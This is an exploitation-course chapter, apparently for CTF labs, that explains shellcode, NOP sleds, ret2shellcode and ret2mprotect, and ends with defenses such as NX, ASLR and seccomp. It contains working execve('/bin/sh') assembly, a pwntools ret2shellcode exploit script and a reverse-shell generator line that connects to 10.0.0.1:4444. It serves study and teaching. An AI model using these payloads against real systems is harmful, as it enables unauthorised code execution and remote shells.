# Chapter 16 — Shellcode & ret2shellcode

> "Shellcode" is the small blob of machine code an exploit runs once it has
> control of `rip`. This chapter explains what it is, how it's built, why **NX**
> made it mostly obsolete (and where it still applies), and how `ret2shellcode`
> works. Conceptual/CTF education — write and run it only against your own lab
> programs.

Prereq: Chapters 1, 2, 12.

---

## 16.1 What shellcode is and why it's small

Shellcode is **position-independent machine code**, usually written to:
- make a syscall like `execve("/bin/sh", NULL, NULL)` (spawn a shell), or
- `connect`/`dup2` a socket (a "reverse shell"), or
- just `mprotect` + jump to a bigger stage.

Constraints that shape it:
- **No NUL bytes**, often — because string copies (`strcpy`) stop at `\x00`. So
  shellcode is written to avoid `\x00` in its bytes (e.g. `xor eax,eax` instead
  of `mov eax,0`).
- **Position-independent** — it may be loaded at an unknown address, so it can't
  hardcode its own location; it computes addresses relatively or pushes strings
  onto the stack.
- **Small** — it must fit in the overflowed buffer.

---

## 16.2 The classic execve("/bin/sh") shellcode (x86-64)

The goal is to execute the syscall `execve(path, argv, envp)`:
- syscall number for `execve` on x86-64 = **59** → in `rax`
- `rdi` = pointer to the string `"/bin/sh"`
- `rsi` = `argv` = NULL (0)
- `rdx` = `envp` = NULL (0)
- then the `syscall` instruction

A standard NUL-free implementation (24 bytes), **annotated**:

```asm
; put "/bin/sh\0" on the stack and point rdi at it
  xor    rsi, rsi        ; rsi = 0            (argv = NULL) — xor avoids a NUL imm
  push   rsi             ; push a NUL qword   (string terminator)
  mov    rdi, 0x68732f6e69622f2f  ; "//bin/sh" (8 bytes, little-endian, no NUL)
  push   rdi             ; stack now holds "//bin/sh\0"
  push   rsp
  pop    rdi             ; rdi = &"//bin/sh"  (points at the string on the stack)
  xor    rdx, rdx        ; rdx = 0            (envp = NULL)
  push   59
  pop    rax             ; rax = 59           (SYS_execve) — avoids mov imm NULs
  syscall                ; execve("//bin/sh", NULL, NULL) -> shell
```

Notes:
- `//bin/sh` (two slashes) is used so the string is exactly 8 bytes and the
  kernel treats `//` like `/`.
- `push N; pop rax` and `xor` set registers **without NUL bytes** (a `mov rax,
  59` would encode zero bytes).

### Generate it instead of hand-assembling

pwntools knows every architecture's shellcode:

```python
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.amd64.linux.sh())   # execve /bin/sh shellcode bytes
print(len(sc), enhex(sc))
# or a reverse shell:
sc = asm(shellcraft.amd64.linux.connect('10.0.0.1', 4444) + shellcraft.amd64.linux.dupsh())
```

To assemble by hand for study:
```bash
# put the asm above in sc.s, then:
gcc -c -o sc.o sc.s && objcopy -O binary -j .text sc.o sc.bin
xxd sc.bin           # inspect bytes; check for 0x00
```

---

## 16.3 ret2shellcode — jump to shellcode you injected

Only works when the memory holding your shellcode is **executable** — i.e. NX is
**off** (`-z execstack`) or you made a region executable first (see §16.5). The
training builds in `src/` use `-z execstack` so this is demonstrable.

Classic flow (stack is executable):

```
1. Place shellcode in the overflowed buffer (or in an env var / another known
   writable+executable buffer).
2. Overflow the return address with the ADDRESS of that shellcode.
3. ret -> rip = shellcode address -> your code runs.
```

Payload shape (buffer big enough to hold the shellcode):

```
[ NOP sled (0x90 ...) ][ shellcode ][ padding ][ address pointing into the NOP sled ]
```

The **NOP sled** (`\x90` = `nop`) is a landing pad: you don't need to hit the
exact shellcode start — any address in the sled "slides" down into the shellcode.
This absorbs imprecision in your address guess (important before you can leak the
real stack address).

pwntools sketch against a stack-executable target:

```python
from pwn import *
context.arch = 'amd64'
elf = context.binary = ELF('./vuln')      # built with -z execstack, -no-pie
p = process(elf.path)

sc  = asm(shellcraft.sh())
buf_addr = 0x7fffffffe000                  # leak or compute; NOP sled absorbs slop
offset = 72                                # from a cyclic pattern

payload  = b'\x90'*(offset - len(sc))      # NOP sled filling up to the ret addr
payload += sc                              # (or put sled first, then sc; adjust)
payload += p64(buf_addr)                   # ret -> somewhere in the sled
p.sendline(payload)
p.interactive()
```

(Exact layout depends on where the buffer is and how big it is; the idea is
"shellcode somewhere executable + ret into it, cushioned by a NOP sled.")

---

## 16.4 Why NX killed this (and what replaced it)

With **NX/DEP** (Chapter 13), the stack and heap are non-executable, so jumping
to injected bytes faults. That's why modern exploitation uses **code reuse**
(ret2libc/ROP, Chapter 12) instead of shellcode. The historical ladder:

```
inject shellcode (ret2shellcode)   -- killed by NX
   -> reuse libc functions (ret2libc)
      -> chain gadgets (ROP)        -- current default
```

So shellcode still matters for: NX-disabled targets (embedded, legacy, CTF
"baby" challenges), and as the **final stage** after a ROP chain re-enables
execution (next section).

---

## 16.5 Bringing shellcode back under NX: `mprotect` / ret2mprotect

Even with NX, you can run shellcode if you first make a region executable. A ROP
chain calls **`mprotect(addr, len, PROT_READ|PROT_WRITE|PROT_EXEC)`** on the page
holding your shellcode, then returns into it:

```
ROP: mprotect(shellcode_page, 0x1000, 7)   ; 7 = R|W|X
ROP: ret -> shellcode_page                 ; now executable -> run shellcode
```

This is a common CTF pattern (`ret2mprotect`): ROP is used just long enough to
flip permissions, then native shellcode takes over (shellcode is far more
flexible than a long ROP chain). Hardened systems restrict W^X transitions
(SELinux `execmem`, `mmap` flags), raising the bar.

---

## 16.6 Other shellcode techniques (awareness)

- **Egg hunting** — when only a tiny buffer is controlled, inject a small
  "hunter" that scans memory for a larger "egg"-tagged second stage placed
  elsewhere.
- **Alphanumeric / printable shellcode** — encodes the payload using only
  printable bytes to pass through input filters (e.g. `isalnum` checks).
- **Encoders** (e.g. XOR decoders) — wrap shellcode to avoid bad bytes
  (`\x00`, `\x0a`, `\x2f`), with a small stub that decodes it at runtime.
- **Staged payloads** — stage 1 is tiny (read more bytes into a buffer, jump);
  stage 2 is the full payload. Used when the initial write is size-limited.

---

## 16.7 Impact & defenses

Shellcode is the *payload*, not the bug — it runs after a Chapter 2/4/12
primitive gives control. Defenses are the same memory-safety and W^X story:
- **NX / W^X** — the primary killer of ret2shellcode.
- **ASLR** — you don't know where your shellcode landed (NOP sleds only partly
  help; a leak is needed for reliability).
- **CET/CFI** — constrain where control can go even after a primitive.
- **SELinux/seccomp** — block `execve`/`mprotect(…,X)` so even perfect shellcode
  can't spawn a shell or flip pages.
- **Remove the bug** — no control primitive, no place to run shellcode.

---

## Recap
- Shellcode is small, position-independent, often NUL-free machine code that
  usually does `execve("/bin/sh")`; pwntools' `shellcraft` generates it.
- **ret2shellcode** injects it into an executable buffer and overwrites the
  return address to point at it (cushioned by a **NOP sled**); it needs NX off.
- **NX** made this obsolete → **ROP/ret2libc**; shellcode returns via
  **`mprotect`/ret2mprotect** or on NX-disabled targets.
- Encoders, egg-hunters, alphanumeric, and staged payloads handle bad-byte and
  size constraints.

Next: **[Chapter 17 — Real-world CVE case studies »](17-case-studies.md)**
